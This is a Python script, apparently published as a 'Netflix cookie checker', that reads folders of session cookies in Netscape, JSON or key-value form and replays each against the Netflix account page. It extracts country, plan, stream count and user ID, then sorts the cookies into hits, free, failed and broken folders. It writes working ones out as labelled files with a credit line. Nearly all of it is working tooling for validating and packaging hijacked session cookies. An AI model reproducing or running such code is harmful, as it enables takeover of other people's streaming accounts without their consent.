import requests
import os
import threading
import colorama
import shutil
import re
import json

# Global counters
total_working = 0
total_fails = 0
total_unsubscribed = 0
total_checked = 0
lock = threading.Lock()

# Global paths
cookies_folder = "cookies"  # Directory where your cookies are stored
hits_folder = "hits"  # Directory to save working cookies
failures_folder = "failures"  # Directory to move failed cookies
broken_folder = "broken"  # Directory to move broken cookies
free_folder = "free"  # Directory to free cookies

def print_banner():
    print(colorama.Fore.RED + """
░█████╗░░█████╗░██████╗░███████╗  ░██████╗██████╗░███████╗░█████╗░████████╗███████╗██████╗░
██╔══██╗██╔══██╗██╔══██╗██╔════╝  ██╔════╝██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██╔════╝██╔══██╗
██║░░╚═╝██║░░██║██║░░██║█████╗░░  ╚█████╗░██████╔╝█████╗░░██║░░╚═╝░░░██║░░░█████╗░░██████╔╝
██║░░██╗██║░░██║██║░░██║██╔══╝░░  ░╚═══██╗██╔═══╝░██╔══╝░░██║░░██╗░░░██║░░░██╔══╝░░██╔══██╗
╚█████╔╝╚█████╔╝██████╔╝███████╗  ██████╔╝██║░░░░░███████╗╚█████╔╝░░░██║░░░███████╗██║░░██║
░╚════╝░░╚════╝░╚═════╝░╚══════╝  ╚═════╝░╚═╝░░░░░╚══════╝░╚════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝

                    A simple netflix cookie checker by smoke-shihab

    """ + colorama.Fore.RESET)
    print("---------------------------------------------------------------------------------------------")

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')
    print_banner()


def load_cookies_from_file(cookie_file):
    """Load cookies from any file, supporting Netscape, JSON, and key-value formats."""
    cookies = {}

    # Try to detect JSON format
    try:
        with open(cookie_file, 'r', encoding='utf-8') as f:
            data = f.read().strip()
            if data.startswith("{") or data.startswith("["):  # Likely JSON
                json_cookies = json.loads(data)
                if isinstance(json_cookies, dict):  # Single object
                    cookies.update(json_cookies)
                elif isinstance(json_cookies, list):  # List of cookies
                    for cookie in json_cookies:
                        if 'name' in cookie and 'value' in cookie:
                            cookies[cookie['name']] = cookie['value']
                return cookies
    except json.JSONDecodeError:
        pass  # Not JSON, continue checking other formats

    # Read line-by-line for other formats
    with open(cookie_file, 'r', encoding='utf-8') as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):  # Ignore empty lines and comments
                continue

            if '\t' in line:  # Likely Netscape format
                parts = line.split('\t')
                if len(parts) >= 7:
                    name, value = parts[5], parts[6]
                    cookies[name] = value

            elif '=' in line and ';' in line:  # Key-Value format (Header-style)
                pairs = line.split(';')
                for pair in pairs:
                    if '=' in pair:
                        name, value = pair.strip().split('=', 1)
                        cookies[name] = value

            elif '=' in line:  # Simple Key-Value format (without semicolons)
                name, value = line.split('=', 1)
                cookies[name.strip()] = value.strip()

    return cookies

def make_request_with_cookies(cookies):
    """Make an HTTP request using provided cookies and return the response text."""
    session = requests.Session()
    session.cookies.update(cookies)
    return session.get("https://www.netflix.com/YourAccount").text

def extract_info(response_text):
    """Extract relevant information from the response text."""
    patterns = {
        'countryOfSignup': r'"countryOfSignup":\s*"([^"]+)"',
        'memberSince': r'"memberSince":\s*"([^"]+)"',
        'userGuid': r'"userGuid":\s*"([^"]+)"',
        'showExtraMemberSection': r'"showExtraMemberSection":\s*\{\s*"fieldType":\s*"Boolean",\s*"value":\s*(true|false)',
        'membershipStatus': r'"membershipStatus":\s*"([^"]+)"',
        'maxStreams': r'maxStreams\":\{\"fieldType\":\"Numeric\",\"value\":([^,]+),',
        'localizedPlanName': r'localizedPlanName\":\{\"fieldType\":\"String\",\"value\":\"([^"]+)\"'
    }
    extracted_info = {key: re.search(pattern, response_text).group(1) if re.search(pattern, response_text) else None for key, pattern in patterns.items()}
    
    # Additional processing for plan names
    if extracted_info['localizedPlanName']:
        extracted_info['localizedPlanName'] = extracted_info['localizedPlanName'].replace('x28', '').replace('\\', ' ').replace('x20', '').replace('x29', '')
    
    # Fixing Member since format
    if extracted_info['memberSince']:
        extracted_info['memberSince'] = extracted_info['memberSince'].replace("\\x20", " ")
    
    # Fixing boolean values
    if extracted_info['showExtraMemberSection']:
        extracted_info['showExtraMemberSection'] = extracted_info['showExtraMemberSection'].capitalize()
    
    return extracted_info

def handle_successful_login(cookie_file, info, is_subscribed):
    """Handle the actions required after a successful login."""
    global total_working
    global total_unsubscribed

    if not is_subscribed:
        with lock:
            total_unsubscribed += 1
        print(colorama.Fore.MAGENTA + f"> Login successful with {cookie_file}. But the user is not subscribed. Moved to free folder!" + colorama.Fore.RESET)
        shutil.move(cookie_file, os.path.join(free_folder, os.path.basename(cookie_file)))
        return

    with lock:
        total_working += 1
    print(colorama.Fore.GREEN + f"> Login successful with {cookie_file} | " + colorama.Fore.LIGHTGREEN_EX + f"\033[3mCountry: {info['countryOfSignup']}, Member since: {info['memberSince']}, Extra members: {info['showExtraMemberSection']}, Max Streams: {info['maxStreams']}.\033[0m" + colorama.Fore.RESET)
    
    new_filename = f"{info['countryOfSignup']}_smoke-shihab{info['showExtraMemberSection']}_{info['userGuid']}.txt"
    new_filepath = os.path.join(hits_folder, new_filename)
    
    with open(cookie_file, 'r', encoding='utf-8') as infile:
        original_cookie_content = infile.read()
    
    # Fixing Plan name
    plan_name = info['localizedPlanName'].replace("miembro u00A0extra", "(Extra Member)")
    # Fixing Member since
    member_since = info['memberSince'].replace("\x20", " ")
    # Fixing Max Streams
    max_streams = info['maxStreams'].rstrip('}')
    # Converting Extra members to Yes/No
    extra_members = "Yes‚úÖ" if info['showExtraMemberSection'] == "True" else "No‚ĚĆ" if info['showExtraMemberSection'] == "False" else "None"
    
    with open(new_filepath, 'w', encoding='utf-8') as outfile:
        outfile.write(f"Plan: {plan_name}\n")
        outfile.write(f"Country: {info['countryOfSignup']}\n")
        outfile.write(f"Max Streams: {max_streams}\n")
        outfile.write(f"Extra members: {extra_members}\n")
        outfile.write("Checker By: https://github.com/smoke-shihab\n")
        outfile.write("Netflix Cookie ūüĎá\n\n\n")
        outfile.write(original_cookie_content)

    os.remove(cookie_file)

def handle_failed_login(cookie_file):
    """Handle the actions required after a failed login."""
    global total_fails
    with lock:
        total_fails += 1
    print(colorama.Fore.RED + f"> Login failed with {cookie_file}. This cookie has expired. Moved to failures folder!" + colorama.Fore.RESET)
    if os.path.exists(cookie_file):
        shutil.move(cookie_file, os.path.join(failures_folder, os.path.basename(cookie_file)))

def process_cookie_file(cookie_file):
    """Process each cookie file to check for a valid login and move accordingly."""
    global total_checked
    with lock:
        total_checked += 1
    try:
        cookies = load_cookies_from_file(cookie_file)
        response_text = make_request_with_cookies(cookies)
        info = extract_info(response_text)
        if info['countryOfSignup'] and info['countryOfSignup'] != "null":
            is_subscribed = info['membershipStatus'] == "CURRENT_MEMBER"
            handle_successful_login(cookie_file, info, is_subscribed)
            return True
        else:
            handle_failed_login(cookie_file)
            return False
    except Exception as e:
        print(colorama.Fore.YELLOW + f"> Error with {cookie_file}: {str(e)}" + colorama.Fore.RESET)
        if os.path.exists(cookie_file):
            shutil.move(cookie_file, os.path.join(broken_folder, os.path.basename(cookie_file)))

def worker(cookie_files):
    """Worker thread to process cookie files."""
    while cookie_files:
        cookie_file = cookie_files.pop()
        process_cookie_file(cookie_file)

def check_cookies_directory(num_threads=3):
    """Setup directories and threads to process all cookie files."""
    os.makedirs(hits_folder, exist_ok=True)
    os.makedirs(failures_folder, exist_ok=True)
    os.makedirs(broken_folder, exist_ok=True)
    os.makedirs(free_folder, exist_ok=True)

    cookie_files = [os.path.join(cookies_folder, f) for f in os.listdir(cookies_folder) if f.endswith('.txt') or f.endswith('.json')]

    clear_screen()  # This already prints the banner, so no need to print again

    print(colorama.Fore.CYAN + f"\n> Started checking {len(cookie_files)} cookie files..." + colorama.Fore.RESET)

    threads = [threading.Thread(target=worker, args=(cookie_files,)) for _ in range(min(num_threads, len(cookie_files)))]

    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()

    # Display statistics
    printStats()


def printStats():
    """Print the statistics of the cookies check."""
    print("\n-------------------------------------------------------------------\n")
    print(colorama.Fore.CYAN + f"> Statistics:" + colorama.Fore.RESET)
    print(f"  -  Total checked: {total_checked}")
    print(f"  -  Working cookies: {colorama.Fore.GREEN}{total_working}{colorama.Fore.RESET}")
    print(f"  -  Working but no subscription: {colorama.Fore.MAGENTA}{total_unsubscribed}{colorama.Fore.RESET}")
    print(f"  -  Dead cookies: {colorama.Fore.RED}{total_fails}{colorama.Fore.RESET}")
    print(f"  -  Thanks For Using Checker --- Checker by https://github.com/smoke-shihab")
    print("\n")

def about_me():
    """Display information about the developer."""
    print(colorama.Fore.CYAN + """
    About Me:
    ---------
    This tool is developed by Ehteshamul Haque.
    GitHub: https://github.com/smoke-shihab
    Discord: https://discord.gg/eFkaGKxEgy
    Email: smokeshihab@gmail.com
    """)

def main_menu():
    """Display the main menu and handle user input."""
    while True:
        print(colorama.Fore.GREEN + """
    Main Menu:
    ----------
    1. Run Scan
    2. About Me
    3. Clear Screen
    4. Exit
    """ + colorama.Fore.RESET)
        choice = input("Enter your choice: ")
        if choice == '1':
            check_cookies_directory()
        elif choice == '2':
            about_me()
        elif choice == '3':
            clear_screen()
        elif choice == '4':
            print(colorama.Fore.RED + "Exiting..." + colorama.Fore.RESET)
            break
        else:
            print(colorama.Fore.RED + "Invalid choice. Please try again." + colorama.Fore.RESET)

def main():
    """Initialize the program."""
    colorama.init()
    clear_screen()  # This already prints the banner, so no need to call print_banner() again
    main_menu()


if __name__ == "__main__":
    main()